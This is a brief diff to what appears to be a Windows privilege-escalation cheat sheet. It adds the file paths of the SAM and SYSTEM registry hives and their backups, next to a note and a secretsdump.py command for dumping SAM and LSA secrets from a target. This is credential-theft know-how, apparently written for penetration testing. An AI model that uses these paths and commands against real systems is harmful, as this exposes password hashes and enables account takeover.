@@ -16,6 +16,14 @@ SYSTEMROOT%\repair\system
 C:\Windows\Repair
 C:\Windows\System32\config\RegBack
 
+Check for SAM and SYSTEM files access:
+%SYSTEMROOT%\repair\SAM
+%SYSTEMROOT%\System32\config\RegBack\SAM
+%SYSTEMROOT%\System32\config\SAM
+%SYSTEMROOT%\repair\system
+%SYSTEMROOT%\System32\config\SYSTEM
+%SYSTEMROOT%\System32\config\RegBack\system
+
 Notes : you can dump SAM and LSA with crackmapexec or secretdump using these commands :
 
 secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
